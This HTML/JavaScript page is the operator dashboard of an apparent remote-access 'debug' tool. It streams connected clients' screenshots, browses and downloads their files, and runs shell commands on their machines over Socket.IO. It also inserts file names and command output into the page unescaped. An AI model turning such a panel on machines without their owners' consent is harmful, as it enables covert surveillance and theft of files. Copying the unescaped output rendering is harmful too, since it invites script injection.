<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remote Debug Tool</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
    <style>
        .screenshot { object-fit: contain; }
    </style>
</head>
<body class="bg-gray-900 text-white min-h-screen">
    <div class="container mx-auto p-4">
        <header class="mb-6 flex justify-between items-center">
            <h1 class="text-2xl font-bold">Remote Debug Tool</h1>
            <span id="connection-status" class="text-sm px-3 py-1 rounded bg-gray-700">Connecting...</span>
        </header>

        <div id="grid-view">
            <h2 class="text-xl mb-4">Connected Clients</h2>
            <div id="clients-grid" class="grid grid-cols-2 md:grid-cols-3 lg:grid-cols-4 gap-4">
            </div>
        </div>

        <div id="detail-view" class="hidden">
            <button onclick="showGrid()" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
            <button onclick="showFiles()" class="mb-4 ml-2 px-4 py-2 bg-blue-700 rounded hover:bg-blue-600">📁 Files</button>
            <button onclick="showTerminal()" class="mb-4 ml-2 px-4 py-2 bg-green-700 rounded hover:bg-green-600">💻 Terminal</button>
            <h2 id="detail-client-id" class="text-xl mb-4"></h2>
            <img id="detail-screenshot" class="w-full bg-black rounded" alt="Client screenshot">
        </div>

        <div id="file-view" class="hidden">
            <button onclick="showDetail(selectedClient)" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
            <h2 id="file-browser-title" class="text-xl mb-4"></h2>
            <div id="file-list" class="bg-gray-800 rounded p-4"></div>
        </div>

        <div id="terminal-view" class="hidden">
            <button onclick="showDetail(selectedClient)" class="mb-4 px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">← Back</button>
            <h2 id="terminal-title" class="text-xl mb-4">Terminal</h2>
            <div class="mb-4 flex gap-2">
                <select id="shell-select" class="px-3 py-2 bg-gray-800 rounded text-white">
                    <option value="">Detecting...</option>
                </select>
            </div>
            <div id="terminal-output" class="bg-black rounded p-4 font-mono text-sm h-96 overflow-y-auto whitespace-pre-wrap"></div>
            <div class="mt-4 flex gap-2">
                <input type="text" id="terminal-input" class="flex-1 px-3 py-2 bg-gray-800 rounded text-white font-mono" placeholder="Enter command..." onkeypress="if(event.key==='Enter')executeCommand()">
                <button id="run-btn" onclick="executeCommand()" class="px-4 py-2 bg-green-700 rounded hover:bg-green-600">Run</button>
                <button id="kill-btn" onclick="killAllCommands()" class="px-4 py-2 bg-red-700 rounded hover:bg-red-600" disabled>Kill All</button>
                <button onclick="clearTerminal()" class="px-4 py-2 bg-gray-700 rounded hover:bg-gray-600">Clear</button>
            </div>
        </div>
    </div>

    <script>
        const socket = io({ transports: ['websocket', 'polling'] });
        let clients = {};
        let selectedClient = null;
        let currentPath = '';
        let pendingFileRequests = {};
        let pendingTerminalCommands = {};
        let clientPlatformInfo = {};
        let currentRunningReqId = null;

        function showGrid() {
            if (selectedClient) {
                console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting stop_viewing');
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            document.getElementById('grid-view').classList.remove('hidden');
            document.getElementById('detail-view').classList.add('hidden');
            document.getElementById('file-view').classList.add('hidden');
            document.getElementById('terminal-view').classList.add('hidden');
            selectedClient = null;
            currentPath = '';
        }

        function showDetail(clientId) {
            console.log('DEBUG showDetail: clientId=', clientId);
            console.log('DEBUG showDetail: selectedClient was=', selectedClient);
            if (selectedClient && selectedClient !== clientId) {
                console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting stop_viewing');
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            selectedClient = clientId;
            currentPath = '';
            document.getElementById('grid-view').classList.add('hidden');
            document.getElementById('detail-view').classList.remove('hidden');
            document.getElementById('file-view').classList.add('hidden');
            document.getElementById('terminal-view').classList.add('hidden');
            document.getElementById('detail-client-id').textContent = clientId;
            console.log('DEBUG showDetail: Emitting start_viewing for', clientId);
            console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting start_viewing');
            socket.emit('start_viewing', {client_id: clientId});
        }

        function showFiles() {
            console.log('DEBUG showFiles: selectedClient=', selectedClient);
            console.log('DEBUG showFiles: clients=', Object.keys(clients));
            console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting stop_viewing');
            if (selectedClient) {
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            document.getElementById('detail-view').classList.add('hidden');
            document.getElementById('file-view').classList.remove('hidden');
            document.getElementById('terminal-view').classList.add('hidden');
            currentPath = '';
            loadFileList('');
        }

        function showTerminal() {
            console.log('DEBUG showTerminal: selectedClient=', selectedClient);
            if (selectedClient) {
                socket.emit('stop_viewing', {client_id: selectedClient});
            }
            document.getElementById('detail-view').classList.add('hidden');
            document.getElementById('file-view').classList.add('hidden');
            document.getElementById('terminal-view').classList.remove('hidden');
            document.getElementById('terminal-title').textContent = `Terminal - ${selectedClient}`;
            
            // Request platform info from client
            const requestId = 'platform_' + Date.now();
            pendingTerminalCommands[requestId] = { action: 'get_platform' };
            socket.emit('get_platform_info', {
                client_id: selectedClient,
                request_id: requestId
            });
        }

        function updateTerminalButtons(isRunning) {
            document.getElementById('run-btn').disabled = isRunning;
            document.getElementById('kill-btn').disabled = !isRunning;
        }

        function executeCommand() {
            const input = document.getElementById('terminal-input');
            const command = input.value.trim();
            if (!command) return;
            
            const shell = document.getElementById('shell-select').value;
            const requestId = 'cmd_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            
            const outputDiv = document.getElementById('terminal-output');
            const prompt = shell.includes('powershell') ? 'PS>' : (shell.includes('cmd') ? '>' : '$');
            outputDiv.innerHTML += `\n${prompt} ${command}\n`;
            
            outputDiv.innerHTML += '(executing...)\n';
            pendingTerminalCommands[requestId] = { command, action: 'execute' };
            
            currentRunningReqId = requestId;
            updateTerminalButtons(true);
            
            console.log('DEBUG WEBUI: executeCommand sending, client_id=', selectedClient, 'requestId=', requestId);
            socket.emit('execute_command', {
                client_id: selectedClient,
                command: command,
                shell: shell,
                request_id: requestId
            });
            console.log('DEBUG WEBUI: executeCommand emitted for', requestId);
            
            input.value = '';
            outputDiv.scrollTop = outputDiv.scrollHeight;
        }

        function killAllCommands() {
            console.log('DEBUG WEBUI: killAllCommands sending, client_id=', selectedClient);
            socket.emit('kill_all_commands', {
                client_id: selectedClient
            });
        }

        function clearTerminal() {
            document.getElementById('terminal-output').innerHTML = '';
        }

        function loadFileList(path) {
            console.log('DEBUG loadFileList: selectedClient=', selectedClient, 'path=', path);
            currentPath = path;
            const displayPath = path ? '/' + path : '/';
            document.getElementById('file-browser-title').textContent = `Files: ${displayPath}`;
            
            document.getElementById('file-list').innerHTML = '<div class="text-gray-400">Loading...</div>';
            
            const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            pendingFileRequests[requestId] = { path: path, isLoading: true };
            
            console.log('DEBUG WEBUI: socket.connected=', socket.connected, 'emitting request_file');
            socket.emit('request_file', {
                client_id: selectedClient,
                path: path,
                request_id: requestId
            });
        }

        function displayFileList(path, data) {
            const fileList = document.getElementById('file-list');
            fileList.innerHTML = '';
            
            if (data.error) {
                fileList.innerHTML = `<div class="text-red-400">Error: ${data.error}</div>`;
                return;
            }
            
            if (data.is_dir) {
                if (path) {
                    const parentBtn = document.createElement('div');
                    parentBtn.className = 'flex items-center p-2 hover:bg-gray-700 cursor-pointer rounded';
                    parentBtn.onclick = () => loadFileList(path.split('/').slice(0, -1).join('/'));
                    parentBtn.innerHTML = '<span class="text-2xl mr-2">📁</span><span class="text-blue-400">..</span>';
                    fileList.appendChild(parentBtn);
                }
                
                data.items.forEach(item => {
                    const row = document.createElement('div');
                    row.className = 'flex items-center justify-between p-2 hover:bg-gray-700 rounded';
                    
                    const left = document.createElement('div');
                    left.className = 'flex items-center cursor-pointer flex-1';
                    left.onclick = () => {
                        if (item.is_dir) {
                            const newPath = path ? path + '/' + item.name : item.name;
                            loadFileList(newPath);
                        } else {
                            openFile(path ? path + '/' + item.name : item.name);
                        }
                    };
                    left.innerHTML = `<span class="text-2xl mr-2">${item.is_dir ? '📁' : '📄'}</span><span>${item.name}</span>`;
                    
                    const right = document.createElement('div');
                    if (!item.is_dir) {
                        const openBtn = document.createElement('button');
                        openBtn.className = 'px-2 py-1 bg-green-700 rounded text-sm hover:bg-green-600 mr-2';
                        openBtn.textContent = 'Open in Browser';
                        openBtn.onclick = (e) => { e.stopPropagation(); openFile(path ? path + '/' + item.name : item.name); };
                        
                        const dlBtn = document.createElement('button');
                        dlBtn.className = 'px-2 py-1 bg-blue-700 rounded text-sm hover:bg-blue-600';
                        dlBtn.textContent = 'Download';
                        dlBtn.onclick = (e) => { e.stopPropagation(); downloadFile(path ? path + '/' + item.name : item.name); };
                        
                        right.appendChild(openBtn);
                        right.appendChild(dlBtn);
                    }
                    
                    row.appendChild(left);
                    row.appendChild(right);
                    fileList.appendChild(row);
                });
            } else {
                const msg = document.createElement('div');
                msg.className = 'text-gray-400';
                msg.textContent = 'This is a file, not a directory';
                fileList.appendChild(msg);
            }
        }

        function openFile(path) {
            console.log('DEBUG openFile: requesting file via Socket.IO');
            const requestId = 'open_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            pendingFileRequests[requestId] = { action: 'open', path: path };
            socket.emit('request_file', {
                client_id: selectedClient,
                path: path,
                request_id: requestId
            });
        }

        function downloadFile(path) {
            console.log('DEBUG downloadFile: requesting file via Socket.IO');
            const requestId = 'download_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
            pendingFileRequests[requestId] = { action: 'download', path: path };
            socket.emit('request_file', {
                client_id: selectedClient,
                path: path,
                request_id: requestId
            });
        }

        function renderClients() {
            const grid = document.getElementById('clients-grid');
            grid.innerHTML = '';
            
            Object.keys(clients).forEach(clientId => {
                const client = clients[clientId];
                const card = document.createElement('div');
                card.className = 'bg-gray-800 rounded-lg overflow-hidden cursor-pointer hover:ring-2 hover:ring-blue-500';
                card.onclick = () => showDetail(clientId);
                
                const img = document.createElement('img');
                img.className = 'w-full h-32 object-cover bg-black';
                img.src = client.screenshot || 'data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7';
                
                const info = document.createElement('div');
                info.className = 'p-2';
                info.innerHTML = `<span class="text-sm font-mono">${clientId}</span>`;
                
                card.appendChild(img);
                card.appendChild(info);
                grid.appendChild(card);
            });
        }

        function updateDetailScreenshot() {
            if (selectedClient && clients[selectedClient]) {
                const img = document.getElementById('detail-screenshot');
                img.src = clients[selectedClient].screenshot || img.src;
            }
        }

        socket.on('connect', () => {
            document.getElementById('connection-status').textContent = 'Connected';
            document.getElementById('connection-status').className = 'text-sm px-3 py-1 rounded bg-green-700';
        });

        socket.on('disconnect', () => {
            document.getElementById('connection-status').textContent = 'Disconnected';
            document.getElementById('connection-status').className = 'text-sm px-3 py-1 rounded bg-red-700';
        });

        let lastReload = parseInt(sessionStorage.getItem('lastReload') || '0');
        let hasConnectedBefore = sessionStorage.getItem('hasConnectedBefore') === 'true';

        socket.on('reload', () => {
            if (!hasConnectedBefore) return;
            const now = Date.now();
            if (now - lastReload > 5000) {
                console.log('Server restarted, reloading...');
                lastReload = now;
                sessionStorage.setItem('lastReload', now.toString());
                setTimeout(() => window.location.reload(), 100);
            }
        });

        socket.on('connect', () => {
            hasConnectedBefore = true;
            sessionStorage.setItem('hasConnectedBefore', 'true');
            fetch('/clients')
                .then(r => r.json())
                .then(data => {
                    data.forEach(c => {
                        if (!clients[c.id]) clients[c.id] = { screenshot: null };
                        clients[c.id].connected = c.connected;
                    });
                    renderClients();
                });
        });

        socket.on('screenshot', (data) => {
            if (!clients[data.client_id]) {
                clients[data.client_id] = {};
            }
            clients[data.client_id].screenshot = data.image;
            clients[data.client_id].timestamp = data.timestamp;
            
            if (selectedClient === data.client_id) {
                updateDetailScreenshot();
            } else {
                renderClients();
            }
        });

        socket.on('connected', (data) => {
            if (!data.client_id) return;
            if (!clients[data.client_id]) {
                clients[data.client_id] = { screenshot: null };
            }
            clients[data.client_id].connected = true;
            renderClients();
        });

        socket.on('disconnected', (data) => {
            if (clients[data.client_id]) {
                clients[data.client_id].connected = false;
                renderClients();
            }
        });

        socket.on('client_removed', (data) => {
            delete clients[data.client_id];
            if (selectedClient === data.client_id) {
                showGrid();
            }
            renderClients();
        });

        socket.on('file_content', (data) => {
            console.log('DEBUG WEBUI: Received file_content:', data);
            const requestId = data.req_id;
            if (requestId && pendingFileRequests[requestId]) {
                const request = pendingFileRequests[requestId];
                const path = request.path;
                delete pendingFileRequests[requestId];
                
                if (request.action === 'open') {
                    // Open file in new tab using data URL
                    console.log('DEBUG WEBUI: Opening file, is_dir=', data.is_dir);
                    if (data.is_dir) {
                        // It's a directory, navigate into it
                        loadFileList(path);
                    } else {
                        const mimeType = data.mime_type || 'application/octet-stream';
                        const content = data.content;
                        const byteCharacters = atob(content);
                        const byteNumbers = new Array(byteCharacters.length);
                        for (let i = 0; i < byteCharacters.length; i++) {
                            byteNumbers[i] = byteCharacters.charCodeAt(i);
                        }
                        const byteArray = new Uint8Array(byteNumbers);
                        const blob = new Blob([byteArray], { type: mimeType });
                        const url = URL.createObjectURL(blob);
                        window.open(url, '_blank');
                    }
                } else if (request.action === 'download') {
                    // Download file
                    console.log('DEBUG WEBUI: Downloading file');
                    if (!data.is_dir) {
                        const mimeType = data.mime_type || 'application/octet-stream';
                        const filename = data.filename || path.split('/').pop();
                        const content = data.content;
                        const byteCharacters = atob(content);
                        const byteNumbers = new Array(byteCharacters.length);
                        for (let i = 0; i < byteCharacters.length; i++) {
                            byteNumbers[i] = byteCharacters.charCodeAt(i);
                        }
                        const byteArray = new Uint8Array(byteNumbers);
                        const blob = new Blob([byteArray], { type: mimeType });
                        const url = URL.createObjectURL(blob);
                        const a = document.createElement('a');
                        a.href = url;
                        a.download = filename;
                        document.body.appendChild(a);
                        a.click();
                        document.body.removeChild(a);
                        URL.revokeObjectURL(url);
                    }
                } else {
                    // Default: display as file list
                    displayFileList(path, data);
                }
            } else {
                // No pending request, might be a file list response
                const path = data.path || '';
                displayFileList(path, data);
            }
        });

        socket.on('command_output', (data) => {
            console.log('DEBUG WEBUI: Received command_output:', data);
            const requestId = data.req_id;
            const outputDiv = document.getElementById('terminal-output');
            
            if (data.all_killed) {
                outputDiv.innerHTML += `(all commands killed: ${data.message})\n`;
                currentRunningReqId = null;
                pendingTerminalCommands = {};
                updateTerminalButtons(false);
            } else if (data.killed) {
                outputDiv.innerHTML += `(killed: ${data.message})\n`;
                currentRunningReqId = null;
                updateTerminalButtons(false);
            } else if (data.error) {
                outputDiv.innerHTML += `<span class="text-red-400">Error: ${data.error}</span>\n`;
                currentRunningReqId = null;
                updateTerminalButtons(false);
            } else {
                // Remove the "(executing...)" text
                const lastExecLine = outputDiv.innerHTML.lastIndexOf('(executing...)');
                if (lastExecLine !== -1) {
                    outputDiv.innerHTML = outputDiv.innerHTML.substring(0, lastExecLine);
                }
                
                if (data.output) {
                    outputDiv.innerHTML += data.output;
                }
                if (data.exit_code !== undefined && data.exit_code !== 0) {
                    outputDiv.innerHTML += `\n<span class="text-yellow-400">(exit code: ${data.exit_code})</span>\n`;
                }
                
                currentRunningReqId = null;
                updateTerminalButtons(false);
            }
            
            outputDiv.innerHTML += '\n';
            outputDiv.scrollTop = outputDiv.scrollHeight;
            
            if (requestId && pendingTerminalCommands[requestId]) {
                delete pendingTerminalCommands[requestId];
            }
        });

        socket.on('platform_info', (data) => {
            console.log('DEBUG WEBUI: Received platform_info:', data);
            
            const requestId = data.req_id;
            const shellSelect = document.getElementById('shell-select');
            
            if (data.platform && data.available_shells) {
                clientPlatformInfo[selectedClient] = data;
                
                shellSelect.innerHTML = '';
                
                const defaultOption = document.createElement('option');
                defaultOption.value = data.default_shell;
                defaultOption.textContent = `${data.default_shell} (default)`;
                shellSelect.appendChild(defaultOption);
                
                data.available_shells.forEach(shell => {
                    if (shell !== data.default_shell) {
                        const option = document.createElement('option');
                        option.value = shell;
                        option.textContent = shell;
                        shellSelect.appendChild(option);
                    }
                });
            }
            
            if (requestId && pendingTerminalCommands[requestId]) {
                delete pendingTerminalCommands[requestId];
            }
        });

        setInterval(() => {
            if (selectedClient) {
                fetch(`/clients/${selectedClient}/latest`)
                    .then(r => r.json())
                    .then(data => {
                        if (data.screenshot) {
                            clients[selectedClient].screenshot = data.screenshot;
                            updateDetailScreenshot();
                        }
                    })
                    .catch(() => {});
            }
        }, 1000);
    </script>
</body>
</html>
